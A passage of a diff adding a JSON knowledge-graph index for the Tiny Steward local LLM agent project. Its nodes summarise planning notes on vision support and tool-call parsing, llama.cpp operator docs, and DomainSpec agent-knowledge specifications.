@@ -1,0 +1,1725 @@
+{
+  "version": "1.0.0",
+  "kind": "knowledge",
+  "project": {
+    "name": "Tiny Steward Knowledge Base",
+    "languages": [
+      "markdown"
+    ],
+    "frameworks": [
+      "karpathy-wiki"
+    ],
+    "description": "Knowledge graph for Tiny Steward Knowledge Base",
+    "analyzedAt": "2026-07-18T03:24:00.133205+00:00",
+    "gitCommitHash": "e43349a7acd9fd4db5a241161604b3732ab1b55f"
+  },
+  "nodes": [
+    {
+      "id": "article:.cursor/plans/f5_vision_starting_gates_95820a49.plan",
+      "type": "article",
+      "name": "F5 Vision \u2014 dependencies, starting conditions, implementation",
+      "filePath": ".cursor\\plans\\f5_vision_starting_gates_95820a49.plan.md",
+      "summary": "**This cycle implements F5 only** (Qwythos + mmproj on orchestrator). Web/browser automation is **F8** (documented below with its own gates), not mixed into F5: `http` is text-only today; Playwrigh...",
+      "tags": [
+        ".cursor\\plans",
+        "roadmaps & planning"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Roadmaps & Planning",
+        "content": "---\nname: F5 vision starting gates\noverview: \"Dependency-aware plan for F5 multimodal vision: host mmproj must be live before Steward can send images. Client work is OpenAI-style image_url content parts via /attach and @path, gated by a multimodal capability probe. Web/browser ingestion is sequenced as F8 with separate starting conditions\u2014not in this implementation cycle. Appendix: llama.cpp already does longest-prefix/LRU slot pick + prompt-cache KV recycle (--cache-ram, --cache-idle-slots); Steward must not reimplement; id_slot=-1 for atomic, pin orch when multi-slot; F3 np>1 checkpoint locality caveat.\"\ntodos:\n  - id: f5-ops-gates\n    content: \"Document and verify host starting conditions: mmproj file, -WithVision, /v1/models multimodal probe, optional CLI smoke\"\n    status: pending\n  - id: f5-probe-config\n    content: Add vision probe + config llm.orchestrator.vision=auto; runtime.vision_enabled\n    status: pending\n  - id: f5-image-attach\n    content: Image /attach @path /image \u2192 OpenAI image_url data-URI parts; LLM body passthrough; size caps\n    status: pending\n  - id: f5-session-normalize\n    content: Persist image path refs in session; normalize preserves image parts; refuse if vision off\n    status: pending\n  - id: f5-tests-docs\n    content: Unit tests + operator.md + mark F5 done in fuera-de-alcance; F8 web gates documented only\n    status: pending\nisProject: false\n---\n\n# F5 Vision \u2014 dependencies, starting conditions, implementation\n\n## Scope decision (fixed)\n\n**This cycle implements F5 only** (Qwythos + mmproj on orchestrator). Web/browser automation is **F8** (documented below with its own gates), not mixed into F5: `http` is text-only today; Playwright/browser MCP would add a second tool surface and VRAM/concurrency pressure on the same orch lane.\n\nAtomic lane stays **text-only** (no mmproj on `:11439`).\n\n---\n\n## Dependency map\n\n```mermaid\nflowchart TD\n  weights[\"mmproj GGUF on disk\"]\n  llama[\"llama.cpp with libmtmd\"]\n  host[\"orch -WithVision --mmproj\"]\n  probe[\"GET /v1/models multimodal\"]\n  client[\"Steward image_url messages\"]\n  attach[\"/attach image + @png\"]\n  session[\"session store image refs\"]\n  gate[\"backends.gate orch\"]\n  nina[\"nina-mcp camera optional later\"]\n  web[\"F8 web ingest deferred\"]\n\n  weights --> host\n  llama --> host\n  host --> probe\n  probe --> client\n  attach --> client\n  client --> session\n  client --> gate\n  nina -.->|\"base64 image after F5\"| client\n  web -.->|\"uses http not vision\"| attach\n```\n\n| Layer | Dependency | Status today |\n|-------|------------|--------------|\n| Weights | `models/mmproj-Qwythos-9B-Claude-Mythos-5-1M-F16.gguf` (~876 MB) + text GGUF | **Present** |\n| Host scripts | [`_common.ps1`](C:/Users/soyko/Documents/Ollama/docker/llamacpp/_common.ps1) `Add-QwythosMmprojArgs`; [`start-qwythos-server.ps1`](C:/Users/soyko/Documents/Ollama/docker/llamacpp/start-qwythos-server.ps1) `-WithVision` | **Ready, off by default** |\n| VRAM | Extra ~0.9 GB F16 projector on orch GPU(s) | Operator must free headroo",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:.cursor/plans/provider-profiles-split_f809ec49.plan",
+      "type": "article",
+      "name": "Provider profiles and runtime split",
+      "filePath": ".cursor\\plans\\provider-profiles-split_f809ec49.plan.md",
+      "summary": "**Do not use those names.** They do not match this codebase.",
+      "tags": [
+        ".cursor\\plans",
+        "roadmaps & planning"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Roadmaps & Planning",
+        "content": "---\nname: provider-profiles-split\noverview: Introduce ProviderProfile abstractions for Qwythos (primary) and Qwen (secondary) chat-template dialects, wire Runtime to profiles instead of a shared try-both parser, then split the 2114-line runtime.py along verified responsibility seams\u2014not into client/server modules. Include a lean fixture eval suite so secondary providers can be swapped and scored without breaking the orchestrator path.\ntodos:\n  - id: extract-parse-messages\n    content: Extract action parse + message normalize into action_parse.py / runtime_messages.py with re-exports from core.runtime; keep all existing tests green\n    status: completed\n  - id: provider-profiles\n    content: Add core/providers/ (Protocol, QwythosProfile, QwenJsonProfile, registry); wire Runtime to profile.extract_actions per backend\n    status: completed\n  - id: config-provider-field\n    content: Add llm.*.provider to config.yaml + steward/Runtime resolution; document in core/README.md; optional /providers meta preview\n    status: completed\n  - id: split-mixins\n    content: Move meta+/set and delegate blocks into runtime_meta.py and runtime_delegate.py mixins; shrink runtime.py facade\n    status: completed\n  - id: provider-evals\n    content: Add evals/providers fixtures + tests/test_provider_evals.py (+ optional fixture-only CLI scorecard)\n    status: completed\nisProject: false\n---\n\n# Provider profiles and runtime split\n\n## Verdict on `runtime_client.py` / `runtime_server.py`\n\n**Do not use those names.** They do not match this codebase.\n\nVerified facts:\n\n- [`core/runtime.py`](core/runtime.py) is **2114 lines** \u2014 larger than every other `core/` module combined except `display.py` (682). Next largest logic modules: `llm.py` (422), `primitives.py` (387).\n- There is **no app-level client/server split** inside Runtime. HTTP to llama.cpp already lives in [`core/llm.py`](core/llm.py) (`LLMClient`). Runtime is a **local orchestrator**: REPL + tool loop + optional delegate child process ([`steward.py`](steward.py) lines 207\u2013249 set `runtime_llm = atomic_llm` for `--delegate-mode`).\n- **No other `core/` module imports Runtime** \u2014 only `steward.py` and tests. Splitting is low-risk for package cycles if re-exports stay stable.\n- Primary vs secondary is already a **lane flag**, not client/server: `_call_llm(..., backend=\"primary\"|\"secondary\")` selects `self.llm` vs `self.atomic_llm` ([`core/runtime.py`](core/runtime.py) ~850\u2013863). Tools payload metadata keys are `tools_payload_sent_primary|secondary` (~481\u2013497).\n\nA `*_client` / `*_server` split would invent a false architecture and confuse operators who already read \u201corchestrator / atomic\u201d in [`config.yaml`](config.yaml) and [`core/README.md`](core/README.md).\n\n**Chosen split (responsibility seams verified by method map):**\n\n| Module | Content (line ranges today) | Approx size |\n|--------|-----------------------------|-------------|\n| [`core/providers/`](core/providers/) | Profile Protocol, notes, Qwythos + Qwen parsers, regis",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:.cursor/plans/tool-calls-integr_42508a5d.plan",
+      "type": "article",
+      "name": "tool-calls-integr_42508a5d.plan",
+      "filePath": ".cursor\\plans\\tool-calls-integr_42508a5d.plan.md",
+      "summary": "1. When the runtime calls either backend, it can include an OpenAI-style `tools` payload (`body[\"tools\"] = tools`) so the backend templates can emit tool calls. 2. The runtime parses tool calls fro...",
+      "tags": [
+        ".cursor\\plans",
+        "roadmaps & planning"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Roadmaps & Planning",
+        "content": "---\nname: tool-calls-integr\noverview: Integrate Qwythos (primary) + Qwen (secondary) tool-call chat templates into Tiny Steward\u2019s runtime by adding OpenAI-style `tools` payload injection, a unified `<tool_call>` parser (Qwen JSON and Qwythos XML), tool-result messaging via `role:\"tool\"`, and `<think>` pruning only for context (while keeping it visible to the user). Maintain retrocompatibility with existing session history without migrating stored messages, and resend the `tools` payload only after tool failures.\ntodos:\n  - id: schemas-tools\n    content: Add `PRIMITIVES_TOOLS` + `PRIMARY_ARGS` to `core/primitives.py` aligned to `Runtime._execute_action()` parameter expectations.\n    status: completed\n  - id: llm-tools-param\n    content: Update `core/llm.py` `chat()` + `chat_stream_with_usage()` to accept optional `tools` and inject `body['tools']`.\n    status: completed\n  - id: display-think-visible\n    content: Modify `core/display.py` to stop stripping `<think>` from `_clean_response()` so user sees reasoning after streaming.\n    status: completed\n  - id: runtime-normalize-prune\n    content: Add `strip_think_from_text()` + `normalize_messages_for_llm()` in `core/runtime.py` to prune `<think>` for LLM context and convert legacy `[Result of ...]` user messages into `role:'tool'` messages.\n    status: completed\n  - id: runtime-unified-extract\n    content: Implement unified `extract_actions()` in `core/runtime.py` supporting Qwen JSON `<tool_call>...` and Qwythos XML `<tool_call>...`, then fallback to legacy `<action>` parsing; map args via `PRIMARY_ARGS` into `{name, body, attrs}`.\n    status: completed\n  - id: runtime-tool-role-results\n    content: Update both runtime loops to append tool execution results as `role:'tool'` messages (not `role:'user'`), while keeping existing `display.print_result()` behavior.\n    status: completed\n  - id: runtime-tools-policy\n    content: Implement session-scoped `tools` payload sending policy in `core/runtime.py` (send once per backend per session; resend only on tool parse/execution failures).\n    status: completed\n  - id: delegate-atomic-loop\n    content: Refactor delegate handling so atomic (Qwen) outputs are parsed for tool calls and executed in a bounded nested loop; stream atomic output to the user while pruning `<think>` only in the prompt sent to atomic.\n    status: completed\n  - id: tests-tooling\n    content: Add unit tests for tool-call parsing (Qwen/Qwythos/legacy), message normalization (legacy result->tool role), and tools payload resend policy using mock LLM clients.\n    status: completed\nisProject: false\n---\n\n## Target behavior\n1. When the runtime calls either backend, it can include an OpenAI-style `tools` payload (`body[\"tools\"] = tools`) so the backend templates can emit tool calls.\n2. The runtime parses tool calls from assistant output using a unified extractor that supports:\n   - Qwen JSON `<tool_call> {\"name\": ..., \"arguments\": {...}} </tool_call>`\n   - Qwythos XML `<tool_call><function=...><",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:core/README",
+      "type": "article",
+      "name": "Tiny Steward \u2014 core package",
+      "filePath": "core\\README.md",
+      "summary": "Runtime, LLM clients, sessions, primitives, and mailbox for Tiny Steward.",
+      "tags": [
+        "core",
+        "core guidelines & identity"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Core Guidelines & Identity",
+        "content": "# Tiny Steward \u2014 core package\n\nRuntime, LLM clients, sessions, primitives, and mailbox for Tiny Steward.\n\n## llama.cpp deployment checklist\n\nVerified on the authoring host (2026-07-16):\n\n| Lane | Port | Flags observed |\n|------|------|----------------|\n| orchestrator (qwythos) | 11440 | `--parallel 1`, `-c 262144` |\n| atomic (qwen3-4b) | 11439 | `--parallel 1`, `-c 98304`, `--jinja` |\n\nImplications:\n\n1. With `--parallel 1`, concurrent out-of-process delegate children **serialize** on the atomic endpoint (503 \"slot busy\" is retried on stream and non-stream paths in `core/llm.py`).\n2. `config.yaml` `llm.atomic.ctx: 98304` matches the atomic server `-c`; orchestrator server context is larger (`262144`) than the `131072` budget Tiny Steward uses for compaction \u2014 intentional headroom, not a bug.\n3. Raise atomic `--parallel N` before relying on multiple simultaneous child terminals.\n4. Mid-generation abort: during streaming, **Ctrl+C** closes the HTTP stream (best-effort free of the llama.cpp slot) and returns a partial response marked `[aborted]` without quitting the REPL.\n5. Stats line shows **LCP** when the server emits `timings.cache_n` / `timings.prompt_n` (high `cache_n` \u21d2 prompt prefix reuse).\n\nSee `ui.delegate_terminal` in `config.yaml` for Windows Terminal / tmux / in-process spawn modes.\n\n## Reasoning / chat_template_kwargs (Qwythos)\n\nOrchestrator defaults (`config.yaml`): `enable_thinking: true`, `preserve_thinking: false`, `thinking_budget_tokens: -1`, `cache_prompt: true`.  \nAtomic defaults: thinking **off**, budget `0` (faster TTFT for micro-agents).\n\n### Provider profiles (`llm.*.provider`)\n\nEach lane selects a **chat-template dialect profile** from `core/providers/`:\n\n| Config value | Lane | Dialect |\n|--------------|------|---------|\n| `qwythos` (default orch) | orchestrator | XML `<function=\u2026><parameter=\u2026>` |\n| `qwen3_json` (default atomic) | atomic | JSON `{\"name\",\"arguments\"}` inside `<tool_call>` |\n\nRuntime parses tool calls via the lane\u2019s profile (not try-all dialects). Legacy `<action>` remains a fallback inside each profile. REPL: `/providers` shows active profiles and ops notes.\n\nREPL:\n\n- `/set enable_thinking on|off` \u2014 nested under `chat_template_kwargs` (alias: `/set thinking \u2026`)\n- `/set preserve_thinking on|off`\n- `/set thinking_budget_tokens N` \u2014 sampler-side; safe to change mid-session\n- `/set cache_prompt on|off` \u2014 keep `on` unless debugging LCP\n- `/providers` \u2014 show primary/secondary profile ids and ops notes\n\nRaw assistant text (including `<think>`) is stored in `session.json`; CoT is also mirrored to `sessions/<name>.think.jsonl`. Only the outbound LLM view strips think (unless `preserve_thinking`). Think-only turns become `[thinking only \u2014 no reply text]` on the wire so history stays non-empty. Pasted REPL chrome is blocked at ingest (`core/prompt_hygiene.py`).\n\n### Backend gate\n\n`backends.gate` in `config.yaml` \u2014 client-side semaphores for `orch` / `atomic` / `embed`. Interactive acquires outrank `/dream`. Complement",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:docs/operator",
+      "type": "article",
+      "name": "Tiny Steward \u2014 operator playbook",
+      "filePath": "docs\\operator.md",
+      "summary": "How to run sessions without wrecking LCP, how to attach long transcripts, and how delegation terminals work.",
+      "tags": [
+        "docs",
+        "other documentation"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Other Documentation",
+        "content": "# Tiny Steward \u2014 operator playbook\n\nHow to run sessions without wrecking LCP, how to attach long transcripts, and how\ndelegation terminals work.\n\n## Workspace home\n\nSteward\u2019s home is the **process cwd** (usually the repo root:\n`\u2026/tiny_steward`). Prefer relative paths. Absolute Windows paths work for\nprimitives, but relative paths keep prompts and tools portable.\n\n## Start a healthy session\n\n1. Set thinking **in `config.yaml`**, not with a burst of `/set` at boot:\n   - orchestrator: `enable_thinking: true`, `preserve_thinking: false`,\n     `thinking_budget_tokens: -1` (or `8192`)\n   - leave `cache_prompt: true`\n2. `python steward.py --session <name>`\n3. First user message = a concrete task (or `/attach` a transcript), **not** a\n   paste of the previous REPL log.\n\n## `/set` \u2014 what is safe\n\n| Key | Mid-session? | Notes |\n|-----|--------------|--------|\n| `thinking_budget_tokens` | Yes | KV-safe |\n| `temperature`, `top_p`, `repeat_penalty`, `max_tokens` | Yes | Sampling only |\n| `enable_thinking`, `preserve_thinking` | **Avoid** | Changes prompt tokens \u2192 LCP cold |\n| `cache_prompt` | Keep `true` | `false` only for debug |\n| `model`, `base_url` | Rare | Rebuilds HTTP client |\n\nBooleans accept only `on|true|yes|1` / `off|false|no|0`.  \n`/set enable_thinking medium` is **rejected** (it used to silently become `false`).\n\nSee also: [`core/README.md`](../core/README.md) KV table.\n\n## LCP (not \u201cLanguage Context Protocol\u201d)\n\nStats line: `LCP cache_n+prompt_n (pct%)`.\n\n- High % \u2192 llama.cpp reused the prompt prefix (good).\n- `0%` right after changing `chat_template_kwargs` / system / tools \u2192 expected\n  for one turn; it should climb again if you stop toggling.\n\nSteward does **not** split the KV cache across parallel inferences when the\nserver runs `--parallel 1`.\n\n## Long transcripts \u2014 attach by path, don\u2019t paste\n\n| Method | Example |\n|--------|---------|\n| Meta command | `/attach sessions/inspect-and-supervise.json` |\n| Inline ref | `Please review @\"sessions/foo.jsonl\"` |\n| Agent tool | `read` / `ls` on the path |\n\nAttachments are capped (`ATTACH_MAX_CHARS`). Prefer this over pasting terminal\ndumps (paste confuses the model and destroys LCP).\n\nAlso: `@sessions/\u2026`, `@plans/\u2026`, `@core/\u2026`, absolute paths, or quoted paths.\n\n## Vision / images (F5)\n\n**Host checklist (required before images work):**\n\n1. mmproj GGUF on disk (e.g. `models/mmproj-Qwythos-\u2026-F16.gguf` under the llamacpp tree).\n2. Restart orch with vision: `.\\start-qwythos-server.ps1 -WithVision` (args must include `--mmproj`).\n3. Confirm `GET http://127.0.0.1:11440/v1/models` lists **multimodal** in `capabilities` (not only `completion`).\n4. Optional once: OpenAI chat with a tiny PNG `image_url` data-URI returns a description.\n5. Prefer a **new Steward session** after flipping `-WithVision` (KV-breaking vs text-only orch).\n\nConfig: `llm.orchestrator.vision: auto` (default) probes on startup; `on` requires multimodal; `off` refuses images. Atomic lane stays text-only (no mmproj).\n\n| Method | Example |\n|---",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:docs/planning_template",
+      "type": "article",
+      "name": "Review Summary \u2014 Task {{task_num}}",
+      "filePath": "docs\\planning_template.md",
+      "summary": "**Generated by:** Qwythos **Creator:** Empero AI",
+      "tags": [
+        "docs",
+        "other documentation"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Other Documentation",
+        "content": "# Review Summary \u2014 Task {{task_num}}\n\n**Generated by:** Qwythos  \n**Creator:** Empero AI  \n\n---\n\n## Status: {{status}}\n\n{{review_text}}\n{constant usage of a task.md for any solicitude and plan.md for any research or implementation plan}\n**Remeber to set as a rule! This template-review.md is still weak and ill-detailed**\n\n> **Enforcement note (F2):** durable project rules live in repo-root [`RULES.md`](../RULES.md)\n> and are injected into the steward system prompt. This file remains a *human review\n> template*, not the rules source of truth.\n\n---\n\n## Next Steps\n\n- [ ] {{next1}}\n- [ ] {{next2}}\n- [ ] {{next3}}\n- [ ] {investigate system prompt and rule-enabling systems}\n- [ ] {plan how to integrate and enforce harnessing with this rule}\n- [ ] {checkout these last three items once completion, leave the first ones as an exmaple}\n- [ ] {leave this one unchecked until we verify the application of this checkout template style rule and the constant usage of a task.md for any solicitude and plan.md for any research or implementation plan}\n**Remeber to set as a rule! This template-review.md is still weak and ill-detailed**",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:DomainSpec/classify",
+      "type": "article",
+      "name": "Skill topic classifier (DomainSpec catalog)",
+      "filePath": "DomainSpec\\classify.md",
+      "summary": "Bootstrap classifier that maps ~831 skill slugs into **topic buckets** for organizing `skills/`.",
+      "tags": [
+        "DomainSpec",
+        "domain specifications"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Domain Specifications",
+        "content": "# Skill topic classifier (DomainSpec catalog)\n\nBootstrap classifier that maps ~831 skill slugs into **topic buckets** for organizing `skills/`.\n\n## Layout decision\n\n**Topic-primary** folders; verb prefix kept as metadata.\n\n```text\nskills/\n\u2514\u2500\u2500 <primary_topic>/          # e.g. application_and_api_security/\n    \u2514\u2500\u2500 <skill_id>/           # original slug, unchanged\n```\n\nCSV columns `verb_prefix` and `secondary_domains` support persona filters without a second folder tree.\n\nThese topic buckets are **catalog tags**, not DomainSpec v2 `type: domain` nodes (`git`, `docker`, `python`). Do not treat mapping rows as Domainspec domain files.\n\n## Files\n\n| File | Role |\n|------|------|\n| `skills_raw.txt` | Input slug list |\n| `classify.py` | Classifier + CSV writer + golden check |\n| `domainspec_mapping.csv` | Generated mapping (regenerate; do not hand-edit) |\n| `golden_set.csv` | Regression expectations |\n| `migrate_skills.py` | Move skill dirs into `skills/<topic>/` from the CSV |\n\n## Run\n\n```bash\npython DomainSpec/classify.py\n```\n\nExit code `0` only if golden set passes. Regenerates `domainspec_mapping.csv`.\n\n## Matching rules\n\n1. Exact anchors: bare domains (`bash`, `git`, \u2026), meta/infra, `legal` \u2192 policy.\n2. Synonym rewrite (`server-side-request-forgery` \u2192 `ssrf`, `canary-tokens` \u2192 `canarytoken`, \u2026).\n3. Domain keyword lists, ordered specific \u2192 general. **First hit = primary topic.**\n4. Short / risky tokens (`cape`, `c2`, `jwt`, `soc2`, \u2026) match as **hyphen-delimited path segments** only \u2014 prevents `cape`\u2208`landscape`/`escape` and `c2`\u2208`soc2`.\n5. Additional domain hits become `secondary_domains` (semicolon-separated).\n6. Fallback: prefixes `detecting-` / `hunting-` / `triaging-` \u2192 `detection_engineering_and_threat_hunting`.\n\n## Latest metrics (after finalize)\n\n| Metric | Value |\n|--------|------:|\n| Total slugs | 831 |\n| Skills | 817 |\n| Bare domains | 6 |\n| Meta / triage | 7 |\n| Policy | 1 |\n| Unclassified | **0** |\n| Golden set | **23/23 pass** |\n\nLargest topic buckets: detection eng (~101), app/API (~81), cloud (~62), AD/identity (~54), DFIR (~54), TI (~53).\n\n## Known limits\n\n- Single primary label is a forced choice for cross-cutting skills (e.g. Android malware \u2192 mobile, with malware as secondary when both hit).\n- Keyword lists will need maintenance as the catalog grows; extend `golden_set.csv` when fixing regressions.\n- Ready as a **mapping artifact**, not yet a filesystem migration. Migration should dry-run from the CSV after a human spot-check.\n\n## Relation to `plan.md`\n\n`plan.md` originally proposed verb-prefix folders. That plan is superseded: **topic-primary** is the organizing axis; verbs remain filter metadata in the CSV.\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:DomainSpec/DomainSpec-v2-Specification",
+      "type": "article",
+      "name": "DomainSpec v2.0 \u2014 A Consolidated Specification for Agent Knowledge Architecture",
+      "filePath": "DomainSpec\\DomainSpec-v2-Specification.md",
+      "summary": "*A revision of the DomainSpec proposal originally sketched by Santiago Javier Espino Heredero (@anarcoiris). v1 correctly diagnosed the problem \u2014 knowledge, behavior, and capability shouldn't live ...",
+      "tags": [
+        "DomainSpec",
+        "domain specifications"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Domain Specifications",
+        "content": "# DomainSpec v2.0 \u2014 A Consolidated Specification for Agent Knowledge Architecture\n\n*A revision of the DomainSpec proposal originally sketched by Santiago Javier Espino Heredero (@anarcoiris). v1 correctly diagnosed the problem \u2014 knowledge, behavior, and capability shouldn't live in one flat file \u2014 but left its own taxonomy inconsistent and its two most interesting ideas (hooks-as-middleware, Progressive Skill Graphs / \"OpenClaw\") undefined. This document keeps the diagnosis and fixes the design.*\n\n---\n\n## 0. What v1 got right\n\n- Splitting a domain into typed sections instead of one prose file is the correct direction.\n- Treating hooks as pluggable, prioritized middleware rather than embedded prose instructions is the most valuable idea in the document.\n- Wanting the format to be both human-readable *and* machine-parsable, with on-demand/progressive loading, is the right target to aim at.\n\nv2 keeps all three. Everything below exists to make them actually work.\n\n---\n\n## 1. Where v1 is inconsistent\n\n| # | Problem in v1 | Why it breaks in practice |\n|---|---|---|\n| 1 | `Tools` and `Tool Preferences` are two sections for one concept | Preference is a *property* of a tool, not a separate category \u2014 a parser has to reconcile two lists that describe the same objects |\n| 2 | `Rules` and `Anti-patterns` overlap | \"Never force push\" appears in both, with no indication of whether they're the same constraint expressed twice or two different ones |\n| 3 | `Procedures`, `Playbooks`, and `Decision Trees` are three formats for one primitive (a sequence or graph of steps) | `investigate_merge_conflict` and the reflog decision tree are structurally identical \u2014 one is prose, one is ASCII art. A parser needs three separate readers for one thing |\n| 4 | Hooks are defined twice, with incompatible schemas | The domain example writes `### before_commit` as prose; a later section shows a YAML schema with `when`, `priority`, `apply`. Nothing says which is canonical or how one maps to the other |\n| 5 | `Memory` exists both inside every domain file *and* as a top-level `memory/facts.md` | Two sources of truth for the same kind of information, no sync rule |\n| 6 | `Skills`, `Domains`, and `Playbooks` aren't distinguished by any rule \u2014 only by which folder they sit in | Nothing in the spec tells you where new content should go |\n| 7 | The hook `when.stage` field is never enumerated | Only two ad hoc stages ever appear \u2014 not a real lifecycle an engine could dispatch on |\n| 8 | \"Machine-parsable\" is asserted, not designed | No schema, no required/optional fields, no types \u2014 nothing to validate a `.domain.md` file against |\n| 9 | Progressive Skill Graphs and OpenClaw are referenced as if already specified | The \"How It Works\" section is three bullets with no data structures, no budget/eviction policy, no trigger taxonomy |\n| 10 | No versioning field, despite \"support versioning and diffs\" being a stated next step | There's nothing for a version or diff tool to key off of |\n\nEvery ",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:DomainSpec/DomainSpec",
+      "type": "article",
+      "name": "\ud83d\ude80 Domain Specification (DomainSpec): A New Paradigm for Agent Knowledge",
+      "filePath": "DomainSpec\\DomainSpec.md",
+      "summary": "Instead of:",
+      "tags": [
+        "DomainSpec",
+        "domain specifications"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Domain Specifications",
+        "content": "Santiago Javier Espino Heredero \n@anarcoiris\n\n---\n\n# \ud83d\ude80 Domain Specification (DomainSpec): A New Paradigm for Agent Knowledge\n\n> **The mistake most frameworks make is mixing knowledge, behavior, and capabilities in one document.**  \n>  \n> A `git_knowledge.md` file often contains:  \n> - What Git *is* (knowledge)  \n> - How to commit (procedure)  \n> - Heuristics like \"check status first\"  \n> - Rules like \"never force push\"  \n> - Tool mappings like \"use `git` tool\"  \n>  \n> These are fundamentally different types of information.  \n>  \n> This document proposes a new abstraction: **Domain Specification (DomainSpec)** \u2014 a structured, modular, and composable way to define what an agent needs to know and do within a domain.\n\n---\n\n## \ud83d\udcda Why DomainSpec?\n\nInstead of:\n\n```markdown\ngit_knowledge.md\n```\n\nWe introduce:\n\n```markdown\ngit_domain_spec.md\n```\n\nOr more generally:\n\n> **Domain Specification (DomainSpec)**  \n> A self-contained, structured document that specifies *everything an agent needs to operate within a domain* \u2014 not just knowledge, but behavior, tools, rules, heuristics, and recovery paths.\n\n---\n\n## \ud83c\udfd7\ufe0f Hierarchy: The Domain Specification Tree\n\n```bash\nknowledge/\n\u2502\n\u251c\u2500\u2500 domains/\n\u2502   \u251c\u2500\u2500 git.domain.md\n\u2502   \u251c\u2500\u2500 python.domain.md\n\u2502   \u251c\u2500\u2500 docker.domain.md\n\u2502   \u251c\u2500\u2500 linux.domain.md\n\u2502   \u2514\u2500\u2500 web.domain.md\n\u2502\n\u251c\u2500\u2500 skills/\n\u2502   \u251c\u2500\u2500 code_review.skill.md\n\u2502   \u251c\u2500\u2500 debugging.skill.md\n\u2502   \u2514\u2500\u2500 deployment.skill.md\n\u2502\n\u251c\u2500\u2500 personas/\n\u2502   \u251c\u2500\u2500 architect.md\n\u2502   \u251c\u2500\u2500 reviewer.md\n\u2502   \u2514\u2500\u2500 ops_engineer.md\n\u2502\n\u251c\u2500\u2500 policies/\n\u2502   \u251c\u2500\u2500 security.md\n\u2502   \u251c\u2500\u2500 privacy.md\n\u2502   \u2514\u2500\u2500 compliance.md\n\u2502\n\u251c\u2500\u2500 templates/\n\u2502   \u251c\u2500\u2500 issue.md\n\u2502   \u251c\u2500\u2500 pr.md\n\u2502   \u2514\u2500\u2500 config.md\n\u2502\n\u251c\u2500\u2500 heuristics/\n\u2502   \u251c\u2500\u2500 universal.md\n\u2502   \u251c\u2500\u2500 coding.md\n\u2502   \u2514\u2500\u2500 shell.md\n\u2502\n\u251c\u2500\u2500 hooks/\n\u2502   \u251c\u2500\u2500 before_tool.md\n\u2502   \u2514\u2500\u2500 after_tool.md\n\u2502\n\u251c\u2500\u2500 playbooks/\n\u2502   \u251c\u2500\u2500 investigate_bug.md\n\u2502   \u2514\u2500\u2500 release.md\n\u2502\n\u251c\u2500\u2500 decision_trees/\n\u2502   \u2514\u2500\u2500 debugging.tree.md\n\u2502\n\u2514\u2500\u2500 memory/\n    \u2514\u2500\u2500 facts.md\n```\n\n> Each file is **self-contained**, reusable, and composable.  \n> The structure enables modular reasoning: agents can load only what they need.\n\n---\n\n## \ud83e\udde9 Structure of a Domain Specification\n\nEach domain specification follows a consistent schema with clearly defined sections.\n\n```markdown\n# Domain\n\nGit\n\n---\n\n## Purpose\n\nVersion control for tracking code changes over time.\n\n---\n\n## Concepts\n\n- Repository  \n- Commit  \n- Tree  \n- Blob  \n- Branch  \n\n> These are the foundational building blocks of the domain.\n\n---\n\n## Capabilities\n\n- Inspect repository state  \n- Modify history  \n- Stage files  \n- Resolve conflicts  \n\n> What actions can the agent perform?\n\n---\n\n## Tools\n\n- `git_status`  \n- `git_commit`  \n- `bash`  \n- `grep_search`  \n\n> The specific tools available in this domain.\n\n---\n\n## Tool Preferences\n\n- Prefer dedicated Git tools over shell commands.  \n- Prefer `status` before `diff`.  \n- Prefer `diff` before `commit`.  \n\n> How to prioritize tool selection for optimal outcomes.\n\n---\n\n## Rules\n\n- Never force push unless explicitly requested.  \n- Never rewrite public history.  ",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:DomainSpec/git.domain",
+      "type": "article",
+      "name": "Git",
+      "filePath": "DomainSpec\\git.domain.md",
+      "summary": "Version control for tracking code changes over time.",
+      "tags": [
+        "DomainSpec",
+        "domain specifications"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Domain Specifications",
+        "content": "---\nid: git\ntype: domain\nversion: 1.0.0\npurpose: Version control for tracking code changes over time.\nextends: []\n\nconcepts:\n  - id: repository\n    name: Repository\n  - id: commit\n    name: Commit\n  - id: tree\n    name: Tree\n  - id: blob\n    name: Blob\n  - id: branch\n    name: Branch\n\ntools:\n  - id: git_status\n    preference_rank: 1\n  - id: git_diff\n    preference_rank: 2\n  - id: git_commit\n    preference_rank: 3\n  - id: bash\n    preference_rank: 9\n    precondition: No dedicated git tool covers this action\n\nrules:\n  - id: no_force_push\n    statement: Never force-push to a shared branch without explicit confirmation.\n    severity: hard\n  - id: no_history_rewrite\n    statement: Never rewrite public history.\n    severity: hard\n  - id: no_delete_without_confirm\n    statement: Never delete branches without confirmation.\n    severity: hard\n  - id: prefer_atomic_commits\n    statement: Prefer small, atomic commits over large batched ones.\n    severity: soft\n\nheuristics:\n  - id: check_history_before_blame\n    statement: Search commit history before blaming a file line-by-line.\n    weight: 1\n  - id: clean_tree_before_merge\n    statement: Confirm a clean working tree before starting a merge.\n    weight: 2\n\nhooks:\n  - id: pre_commit_check\n    when:\n      stage: pre_action\n      event: git_commit\n    priority: 10\n    scope: git\n    apply:\n      rule_refs: [prefer_atomic_commits]\n      checklist:\n        - Tests pass\n        - Working tree is clean\n        - Commit message 